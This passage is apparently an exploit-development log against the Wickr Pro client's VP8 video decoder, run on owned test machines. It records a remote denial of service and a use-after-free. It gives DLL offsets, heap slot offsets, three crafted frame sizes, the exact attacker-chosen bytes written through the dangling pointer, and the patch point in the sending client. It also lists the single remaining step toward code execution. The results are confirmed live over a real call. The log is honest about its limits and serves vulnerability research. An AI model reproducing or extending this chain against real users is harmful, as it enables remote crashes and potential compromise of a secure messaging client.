**Consequence for target selection.** The best-controlled allocation in the whole media path
is out, so the target has to be some other array-like allocation in the media pipeline — and
enumerating those requires the pipeline to be running, i.e. a live call. Combined with §11c
(the target pointer must already point into memory the attacker can spray), the live search
is now tightly specified but it is genuinely blocked on the environment.

## 13. My "link (1) needs a live call" claim was WRONG. Retracted, and here is the data.

I stated twice that the objects which could reclaim the freed `mip` block "only exist during
a live call", and that link (1) was therefore unmeasurable in this environment. **That is
false.** NPL.dll exports the entire graph-construction API:

```
NPLSceneCreate / NPLSceneAddNode / NPLSceneConnectNodes / NPLSceneStart
NPLNodeCreate(name, scene, ...)      <- a NAME-KEYED FACTORY
NPLAVSourceCreate / NPLAVSourcePushPacket / NPLAVFormatCreate
```

`NPLNodeCreate` string-matches against a `{const char* name, factory}` table at **RVA
`0x539540`** (found from `lea r8,[rip+0x16775f]` at `0x1803d1dda`), listing 17 node types:

> Puller, Serializer, **Parser**, Splitter, **Muter**, **PacketQueue**, **PacketMonitor**,
> ScreenCapture, **JitterBuffer**, VideoEncoder, **VideoDecoder**, VideoConverter,
> VideoResizer, Camera, Crop, AspectRatioCrop, Rotate

— i.e. exactly the receive-scene nodes the app logs as
`NetworkSource->Muter->Parser->CryptProxy->...`.

**Standing them up locally puts their allocations in MY process, where `HeapWalk` works
in-process** — the enumeration ToolHelp refused to do cross-process (§11d).

### 13a. It runs. `nplgraph.py`, against the installed NPL.dll.

```
[+] NPLInitialize -> 6
[+] NPLSceneCreate -> 0x800051d7b0
[Parser]        NPLNodeCreate -> 0x8000c47be0   14 new heap blocks
[Muter]         NPLNodeCreate -> 0x8000d6a220   11 new heap blocks
[PacketQueue]   NPLNodeCreate -> 0x8000ca4230   15 new heap blocks
[PacketMonitor] NPLNodeCreate -> 0x8000d54c30   10 new heap blocks
[Splitter]      NPLNodeCreate -> 0x8000d73f40   30 new heap blocks
[Puller]        NPLNodeCreate -> 0x8000d52840   13 new heap blocks
[JitterBuffer]  -> NULL      [VideoDecoder] -> NULL     (need other args/a format)
```

### 13b. The measurement — pointers DO sit at F4-2-reachable offsets. CONFIRMED.

Every one of those nodes allocates a **1702-byte** block, which is in an
attacker-reproducible size class (NT heap bucket 107; the attacker makes 1695 bytes from
`(mb_cols+1)(mb_rows+1)·76+23` with `(mb_cols,mb_rows) = (1,10)` or `(10,1)`).

| node | 1702-byte block holds a pointer at | slot type |
|---|---|---|
| `PacketQueue` | **552, 560, 568** | writable |
| `PacketMonitor` | **248, 256, 264** | writable |
| `Puller` | **248, 256, 264** | writable |

Under geometry `(mb_cols=1, mb_rows=10)`, `mi_off = 244`, records land at 244, 396, 548, …
so `548+4 = 552` is the `mv` field and `548+12+4k = 560, 568, …` are `bmi[0]`, `bmi[2]`; and
`244+4 = 248`, `244+12 = 256`, `244+20 = 264` likewise. **The offsets line up exactly.**

> **⇒ Media-pipeline allocations in attacker-reproducible size classes DO carry pointers at
> offsets the F4-2 write can reach.** That is the structural half of link (1), answered
> without a call, against the real DLL.

### 13c. But none of them is on a CLEAN slot — so this still needs a leak

Bucket 107 admits exactly **two** attacker geometries, and I checked both:

```
mbc=1  mbr=10  size=1695  mi_off=244   writable [552,560,568] and [248,256,264]   clean []
mbc=10 mbr=1   size=1695  mi_off=928   writable []                                clean []
```

**No clean slot lands on any observed pointer.** So a write there is not the leak-free
partial overwrite of §6e: a pointer at 560 has its low half on `bmi[0]` and its high half on
`bmi[1]` — both chosen — which is a *full* 8-byte pointer write, and that needs an
alphabet-compatible target address, i.e. an information leak. A pointer at 552 has its low
half on `mv` and its high half on the `mbmi` tail, which gets clobbered (the failure measured
in §6e step 1).

**Honest status of link (1):** the structural precondition is **CONFIRMED** — reachable
pointers exist, in reproducible size classes, in real media-pipeline objects. The
*leak-free* variant is **not** demonstrated for any object enumerated so far.

**QUALIFIER:** this enumerates allocations from node *construction*. A running graph
(`NPLSceneStart` + `NPLAVSourcePushPacket`) allocates more, including per-packet and
per-stream structures, and those have not been enumerated. That is the next step and it is
now clearly feasible locally — no call, no second endpoint.

## 14. The live victim is configured BELOW a single keyframe's requirement — the chain shortens

Operator measured the intended victim (own machine, 4 GiB class):

```
commit limit : 6953 MiB
commit free  : 1524 MiB     <-- the number that matters
phys total   : 4031 MiB
```

**1524 MiB is below the ~2017 MiB that ONE 16383x16383 keyframe needs.** So the very first
huge keyframe fails; the two-decoder-context memory-parking sequence of §7 is **not needed
on this victim**. Reproduced in-harness at exactly that figure:

```
uaf_steer.py 1524 64
[A] 64x64 keyframe -> rc=0            [B] 16383x16383 -> rc=-1, mip=0, mi DANGLING
[CONFIRMED] 4/4 attacker-chosen motion vectors written through the dangling pc->mi
```

**Two consequences, both material:**

1. The wire sequence drops from five packets to **three** — `A_small_keyframe.vp8` (41 B),
   `B_huge_keyframe.vp8` (34 B), `C_splitmv_inter.vp8` (108 B). **183 B → 183 B across 3
   packets**, one context.
2. **The sender no longer has to touch bit 14 of `Frame+0x90`.** That was the only field in
   the whole chain living *outside* the VP8 bitstream, i.e. the only thing the injector had
   to reach into NPL's frame metadata to set. The injector now only has to emit three VP8
   frames in order on an ordinary video stream, which is a much smaller patch.

**Note on generality, so this is not over-claimed:** a victim in this state is *more*
exposed than the §7 threshold implies, not less — §7's ~4034 MiB figure is the bound for
victims that still have headroom for one keyframe, and it stands for them. This particular
victim simply sits below the easier bound.

**Operational warning for the live run:** the huge keyframe asks Windows for ~2 GiB on a
machine with 1524 MiB free commit. Expect the victim machine to hitch while the request is
serviced and refused. That is the intended behaviour (F4-3 is a DoS in its own right), but
it is worth knowing before blaming it on something else.

## 15. LIVE OVER-THE-WIRE DELIVERY — CONFIRMED. Link (2) is closed.

2026-07-31, two owned machines, two owned accounts, a real Wickr call. Attacker patched at
`WickrPro!encryptCallback 0x147170`; victim unmodified except for the passive probe.
Victim = the analysis host, chosen deliberately because its 19.5 GiB free commit means the
16383×16383 allocation **succeeds**, so the gate does not open and nothing crashes. This
isolates delivery from exploitation.

```
decode#843 len=41  first16=f001009d012a40004000...   <== FRAME A (64x64 keyframe)
alloc: request 64x64        PRE-FREE mip=0x8010fb4030 mi=0x8010fb479c  old geom 23x23
decode#844 len=34  first16=1001009d012aff3fff3f...   <== FRAME B (16383x16383 keyframe)
alloc: request 16383x16383  PRE-FREE mip=0x800ed26070 mi=0x800ed26238  old geom 4x4
decode#845 len=108 first16=310b0000...               <== FRAME C (SPLITMV inter)
invocations=5  FAILURES=0  decodes=845  (max geometry 16383x16383)
```

**All three crafted frames reached `vpx_codec_decode`, in order, and were decoded.** A drove
the decoder from the real 360×360 stream to 64×64; B then drove it to 16383×16383; C followed.

**The arming geometry matches the harness byte for byte:**

| | measured live | predicted |
|---|---|---|
| geometry when B ran | `old geom 4x4` | 4×4 (= A's 64×64) |
| `mi − mip` | **456** | `(mb_cols+1+1)·76 = 6·76 = 456` |
| block B would free | 1923 B | `(4+1)(4+1)·76+23 = 1923` |

1923 bytes with `mi` 456 in is **exactly** the configuration `uaf_steer.py` / `uaf_partial.py`
/ `uaf_pc.py` have been reproducing all along. On a victim whose free commit is below
~2017 MiB, that same B fails, `vp8_de_alloc_frame_buffers` frees this block and NULLs `mip`
while `mi` keeps pointing 456 bytes into it, and C writes attacker-chosen bytes through it.

### 15a. Three delivery bugs, all mine, all found by measurement rather than argument

1. **Fired on the first packets of the call.** They go out before the peer finishes
   subscribing and are dropped. Fixed with an operator-armed trigger (press ENTER once video
   is flowing) rather than a guessed packet index.
2. **Fired into one simulcast layer only.** `--recon` showed the two layers (bit 14 of
   `[Packet+0x90]`) alternate almost every packet — run-lengths `{1:574, 2:161, 3:1}` — so a
   single counter scatters A/B/C across two decoder contexts. Fixed with per-layer counters:
   each layer gets its own A,B,C.
3. **Wrong buffer layout.** The first attempt put the frame at `ptr+0` with `len = frame_len`.
   The victim decoded **12** bytes for a 41-byte frame and logged *"All bytes set to zero,
   decryption failed most likely"*. 41 − 12 = 29. `--recon` with a byte dump then showed
   **477/477 packets — audio and video alike — begin with exactly 29 zero bytes at `ptr`**,
   with the real payload at `ptr+29` and `[Packet+0x18]` counting them. Fixed by staging each
   frame as `[29 zero][frame]` with `len = 29 + frame_len`.

That third failure is worth keeping: the diagnostic that identified it was **F4-1's own
zero-fill log line**. The memset arm this engagement characterised in Wave 4 fired on our
malformed packet and announced itself.

### 15b. Chain status

| link | status |
|---|---|
| gate: one peer arms it | MEASURED in-harness; **not yet on a live low-memory victim** |
| **live over-the-wire delivery** | **CONFIRMED — this section** |
| content control through the dangling pointer | MEASURED (§4) |
| ASLR-surviving partial pointer overwrite | MEASURED (§6e) |
| PC control from the primitive | MEASURED, harness-supplied reclaimer (§8) |
| a real reclaiming object in live WickrPro | OPEN |

**Still not RCE.** What this closes is delivery: an authenticated call peer can put chosen
VP8 frames into a victim's decoder, in order, over a normal call, with the codec negotiation
untouched. The next run is the same sequence against the 4 GiB victim (free commit 1524 MiB),
where B's allocation fails.

## 16. F4-3 CONFIRMED LIVE — and the gate did NOT open, for a reason worth recording

Same sequence, victim = the 4 GiB machine (measured earlier: commit limit 6953 MiB, **commit
free 1524 MiB**, phys 4031 MiB). All three frames delivered again:

```
decode#27 len=41  <== FRAME A     alloc: request 64x64   PRE-FREE mip=0x1f1792cb250 mi=0x1f1792cb9bc
decode#28 len=34  <== FRAME B     alloc: request 16383x16383  PRE-FREE mip=0x1f16d1235a0 mi=0x1f16d123768
decode#29 len=108 <== FRAME C
invocations=3  FAILURES=0  (max geometry 16383x16383)
```

`mi − mip = 0x1c8 = 456` again, block 1923 B again — the arming geometry reproduces exactly.

**But `FAILURES=0`: the 2 GiB allocation SUCCEEDED on a machine with 1524 MiB of free commit.**

### 16a. Why — and it corrects my own reasoning

`commit free` is a **snapshot, not a bound**. With a system-managed pagefile Windows **grows
the pagefile** when a large commit request arrives, raising the commit *limit* itself. So
"free commit 1524 MiB" never meant "a 2017 MiB request will fail".

**§7's threshold is therefore mis-stated.** The real precondition is not "free commit below
~4034 MiB" but:

> **the victim's commit LIMIT must be unable to grow to satisfy the request** — i.e. a fixed
> size or disabled pagefile, a pagefile whose volume is full, or an already-exhausted limit.

On a default Windows install with a system-managed pagefile and free disk, F4-3's allocation
will generally succeed and the F4-2 gate stays shut. That materially narrows F4-2's
reachability and it should be stated wherever the threshold appears.

### 16b. What DID happen: F4-3 confirmed live, over the wire

The operator reports the victim's **WickrPro crashed / became unresponsive** after the run.
That is F4-3 doing exactly what Wave 4 described, now demonstrated remotely for the first
time: a **34-byte** keyframe from an authenticated call peer forces ~2017 MiB of commit on a
4 GiB victim, Windows grows the pagefile to satisfy it, and the machine thrashes.

> **CONFIRMED, live, over a real call: a 34-byte peer-supplied VP8 frame is a remote
> denial-of-service against an unsandboxed WickrPro.** Wave 4 had this as a harness
> measurement (§F4-3, "111-byte keyframe forces 2017 MiB"); it is now an over-the-wire result
> with a smaller frame.

### 16c. Tooling change

`victim_probe.exe --cap <headroom MiB>` now applies a **Job Object per-process commit limit**
(`JOB_OBJECT_LIMIT_PROCESS_MEMORY`) to WickrPro before arming, set to *current usage +
headroom*. A job limit cannot be grown away by pagefile expansion, so it reproduces the state
of a victim whose commit limit is genuinely fixed. Same mechanism the offline harness has
used throughout. The cap disappears when the probe exits.

**Qualifier to carry:** with `--cap`, the allocation failure is induced by a per-process
limit rather than by natural system exhaustion. The gate mechanics downstream are identical —
`malloc` returns NULL inside `vp8_alloc_frame_buffers` — but the honest statement is
"reachable on a victim whose commit limit cannot grow", not "reachable on any 4 GiB host".

## 17. ★ THE GATE OPENED, LIVE, OVER THE WIRE. But C did not land.

2026-07-31, victim = the 4 GiB machine with `victim_probe.exe --cap 400` (a Job Object
per-process commit limit: 164 MiB in use, capped at 564 MiB).

```
decode#28 len=41  <== FRAME A     alloc: request 64x64        PRE-FREE mip=0x1accaa0fca0 mi=0x1accaa1040c
decode#29 len=34  <== FRAME B     alloc: request 16383x16383  PRE-FREE mip=0x1acc83c7570 mi=0x1acc83c7738

*** ALLOCATION FAILED -- F4-2 GATE OPEN ***
    pc=0x1acca886360  pc->mip=0x0 (NULLed by de_alloc)  pc->mi=0x1acc83c7738 (DANGLING)
    freed block base = 0x1acc83c7570, size 1923 B (old geom 4x4)
    mi sits 456 bytes into it
```

**This is the first time F4-2's gate has been opened by a remote peer.** Wave 4 recorded it
as *"Peer-reachability UNKNOWN — gated on an allocation failure"* and *"the gate does NOT
open for a single peer on this host class"*. It opens: one authenticated call participant,
a **34-byte** VP8 frame, and the victim's decoder is left with `pc->mip == 0` and `pc->mi`
dangling 456 bytes into a freed 1923-byte block — the exact configuration the offline
harness has been reproducing all along.

**QUALIFIER, and it is load-bearing:** the allocation failure was induced by a Job Object
per-process commit cap, because §16a established that a default Windows install grows its
pagefile and satisfies the 2 GiB request. So the honest statement is *"reachable on a victim
whose commit limit cannot grow"*, not *"reachable on any 4 GiB host"*.

### 17a. Why the write did not happen

Four dumps at t+0ms / +200ms / +1s / +3s are **byte-identical and all zero**, and the run
ends with:

```
alloc: request 360x360   PRE-FREE mip=0x0 mi=0x1acc83c7738  old geom 4x4
```

The real stream's next 360×360 keyframe re-ran `vp8_alloc_frame_buffers` and **repaired
`pc->mi`**. No `decode#` line for the 108-byte C appears between the failure and that repair,
and C's length is under the 200-byte detail threshold, so it would have been logged if it had
been decoded. **C never reached the decoder inside the window.**

Two changes follow, and both were mistakes of mine:

1. **C was fired once.** A single C is a one-shot at a window whose width nobody controls —
   it closes as soon as the app pulls a fresh keyframe after the decode error. The sender now
   substitutes **A, B, then C into every further matching packet** (up to 32 per layer), so
   the window's width becomes the limiting factor instead of luck.

2. **C wrote a pattern that was invisible.** Its 16 sub-vectors were 15 zeros plus one value,
   and the freed block is all zeros — so "C did not write" and "C wrote zeros" produced the
   identical observation. That is the same non-discriminating-experiment error this engagement
   keeps paying for (brief §0 rule 4). C now carries **16 distinct, all-nonzero vectors**
   (330 bytes instead of 108); any write at all is unmistakable in the dump.

## 18. ★★★ F4-2 DEMONSTRATED END TO END, LIVE, OVER A REAL CALL

2026-07-31. Attacker = one authenticated call participant on an owned machine, patched only
at `WickrPro!encryptCallback`. Victim = the 4 GiB machine, stock client, `victim_probe --cap 400`.
Three VP8 frames — **41 + 34 + 330 bytes** — put on the wire by the peer.

```
decode#26 len=41  <== FRAME A    alloc: request 64x64        PRE-FREE mip=0x1accabc2990 mi=0x1accabc30fc
decode#27 len=34  <== FRAME B    alloc: request 16383x16383  PRE-FREE mip=0x1acc4e5faf0 mi=0x1acc4e5fcb8

*** ALLOCATION FAILED -- F4-2 GATE OPEN ***
    pc=0x1accaa87260  pc->mip=0x0 (NULLed by de_alloc)  pc->mi=0x1acc4e5fcb8 (DANGLING)
    freed block base = 0x1acc4e5faf0, size 1923 B   mi sits 456 bytes into it
```

Then frame C wrote **through the dangling pointer**, and the dump at t+0ms shows it. Four
MODE_INFO records — the four steered macroblocks (1,1) (1,3) (3,1) (3,3) at block+912, +1064,
+1672, +1824, exactly `mi_off + (r·stride+c)·76` — each carrying:

```
mode=9 (SPLITMV)   ref_frame=1 (LAST)   is_4x4=1   partitioning=3 (16-way split)
bmi[16] = 64003600 a6fee800 500266fe 46034c02 c4fbfe02 3205b003 28069efb e2f81405
          1400c605 0a017806 00fed6f8 f602dc07 ec039000 1efb4201 d8050cfe 00000001
```

**That is byte-for-byte the 64 bytes the attacker asked for:**

```
requested (100,54) (-346,232) (592,-410) (838,588) (-1084,766) (1330,944) (1576,-1122)
          (-1822,1300) (20,1478) (266,1656) (-512,-1834) (758,2012) (1004,144)
          (-1250,322) (1496,-500) (0,256)
want 64003600a6fee800500266fe46034c02c4fbfe023205b00328069efbe2f814051400c6050a01780600fed6f8f602dc07ec0390001efb4201d8050cfe00000001
got  64003600a6fee800500266fe46034c02c4fbfe023205b00328069efbe2f814051400c6050a01780600fed6f8f602dc07ec0390001efb4201d8050cfe00000001
```

**The victim process then died** — `[dump t+1s] unreadable` / `[dump t+3s] unreadable`, i.e.
`ReadProcessMemory` failed because the process was gone between +200 ms and +1 s.

> **CONFIRMED, live, over a real Wickr call: an authenticated call peer sends 405 bytes of
> VP8 across three frames and obtains a content-controlled use-after-free write in the
> victim's unsandboxed process, with the written bytes matching its request exactly, followed
> by process death.**

### 18a. What this is NOT — and the reason is in the dump

**It is not RCE.** The block C wrote into was **still free**. The dump's `-8` slot holds
`e0 fa e5 c4 ac 01 00 00` = `0x1acc4e5fae0`, a heap pointer into the block's own header
region — the shape of a free-list entry — and the rest of the block is zeros with scattered
`01 00` filler. Nothing had reclaimed it.

So the write corrupted **free** memory, not a live object. There was no vtable to redirect
and no virtual call to hijack; the process died from heap damage, not from attacker control
of the instruction pointer.

**Link (1) — a real reclaiming object — is still open, and it is now the only thing between
this and RCE.** §11b/§11c narrowed what it has to be: array-like (the first 244 bytes of the
block are unreachable under every geometry, so an object's vtable at offset 0 can never be
hit), in an attacker-reproducible size class, holding a pointer that already points into
memory the attacker can spray. §13b found real candidates (`PacketQueue`, `PacketMonitor`,
`Puller` each hold a 1702-byte block with pointers at reachable offsets), but none of them
reclaimed this block in this run.

### 18b. Chain status

| link | status |
|---|---|
| gate opened by a remote peer | **CONFIRMED LIVE** (§17) — with the commit-cap qualifier |
| live over-the-wire delivery | **CONFIRMED LIVE** (§15) |
| content-controlled UAF write, byte-exact | **CONFIRMED LIVE** (this section) |
| victim process death | **CONFIRMED LIVE** |
| ASLR-surviving partial pointer overwrite | MEASURED in-harness (§6e) |
| PC control from the primitive | MEASURED in-harness, harness-supplied reclaimer (§8) |
| **a real reclaiming object holding a pointer** | **OPEN — the only remaining link** |

### 18c. Qualifiers that travel with this result

1. The allocation failure was induced by a **Job Object per-process commit cap**. A default
   Windows install grows its pagefile and satisfies the 2 GiB request (§16a). The claim is
   *"reachable on a victim whose commit limit cannot grow"*.
2. The attacker side required patching **one instruction window** in the attacker's own
   client (`encryptCallback`, 6 bytes) to emit chosen VP8 frames. That models a malicious
   peer, which is the threat model F4-2 was always scoped to; it is not a defect in the
   victim.
3. Nothing on the victim was modified except the passive probe, which restores on exit.
